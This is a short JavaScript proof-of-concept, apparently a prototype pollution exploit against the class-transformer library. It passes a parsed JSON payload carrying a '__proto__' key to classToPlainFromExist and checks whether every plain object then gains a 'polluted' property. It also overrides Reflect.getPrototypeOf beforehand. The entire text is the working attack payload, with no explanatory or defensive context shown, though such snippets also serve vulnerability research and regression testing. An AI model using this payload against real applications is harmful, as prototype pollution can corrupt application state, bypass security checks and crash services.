Reflect.getPrototypeOf = () => false;
console.log({}.polluted);
const root = require('class-transformer');
const payload = JSON.parse('{"__proto__": {"polluted": "yes"}}');
root.classToPlainFromExist(payload, {});
console.log({}.polluted);